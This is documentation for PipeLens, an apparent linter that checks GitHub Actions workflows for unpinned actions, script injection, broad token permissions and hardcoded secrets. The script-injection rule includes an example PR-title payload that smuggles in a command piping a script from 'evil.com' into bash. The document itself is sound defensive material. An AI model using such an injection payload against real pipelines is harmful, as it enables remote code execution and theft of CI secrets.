# PipeLens Security & Linter Rules

PipeLens enforces supply-chain security and least-privilege standards on GitHub Actions workflow files (`.github/workflows/*.yml`).

---

## Rule PL-SEC-001: Unpinned Action Reference

- **Severity**: High (or Critical if completely unversioned)
- **Category**: Supply Chain Security
- **Fix**: Automated via `pipelens fix`

### Explanation
Referencing third-party GitHub Actions by a mutable git branch or tag (such as `@v4` or `@main`) exposes pipelines to supply-chain attacks. If an attacker compromises the upstream repository or developer account, they can push malicious code under the existing tag.

Pinning the action to a full 40-character commit SHA ensures the runner executes exact, immutable code. A version comment can be added for human readability:

```yaml
# Insecure
- uses: actions/checkout@v4

# Hardened
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

---

## Rule PL-SEC-002: Potential Script Injection Vulnerability

- **Severity**: Critical
- **Category**: Script Injection
- **Fix**: Manual (assign context to environment variable)

### Explanation
Directly evaluating untrusted GitHub event contexts inside an inline `run:` script allows external contributors or issue reporters to execute arbitrary shell commands on the runner.

Vulnerable contexts include:
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.pull_request.title`
- `github.event.comment.body`
- `github.head_ref`
- `github.event.commits.*.message`

When an attacker opens an issue or pull request with shell metacharacters (e.g. `title: test"; curl evil.com/exfil.sh | bash; echo "`), the runner interprets the payload as shell code.

```yaml
# Vulnerable
- name: Echo PR Title
  run: echo "PR title is ${{ github.event.pull_request.title }}"

# Hardened
- name: Echo PR Title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title is $PR_TITLE"
```

---

## Rule PL-SEC-003: Missing Explicit Permissions

- **Severity**: Medium
- **Category**: Least Privilege
- **Fix**: Automated via `pipelens fix`

### Explanation
Workflows that do not declare top-level `permissions:` inherit default repository token permissions. Depending on organization settings, this can grant write access to repository contents, packages, issues, and pull requests.

Workflows should explicitly declare the minimum permissions required:

```yaml
permissions:
  contents: read
```

---

## Rule PL-SEC-004: Overly Permissive GITHUB_TOKEN (write-all)

- **Severity**: High
- **Category**: Least Privilege
- **Fix**: Manual

### Explanation
Setting `permissions: write-all` at the workflow root or job level grants broad write permissions across all scopes (deployments, checks, contents, packages, issues, discussions). If any step or dependency is compromised, the attacker can leverage the GITHUB_TOKEN to tamper with releases or write to branches.

---

## Rule PL-SEC-005: Hardcoded Secret or Token Leak

- **Severity**: Critical
- **Category**: Secrets Management
- **Fix**: Manual

### Explanation
Hardcoding personal access tokens, AWS keys, Slack tokens, or private keys directly in workflow files exposes credentials in git history. Credentials must be stored in GitHub Secrets and accessed via `${{ secrets.SECRET_NAME }}`.
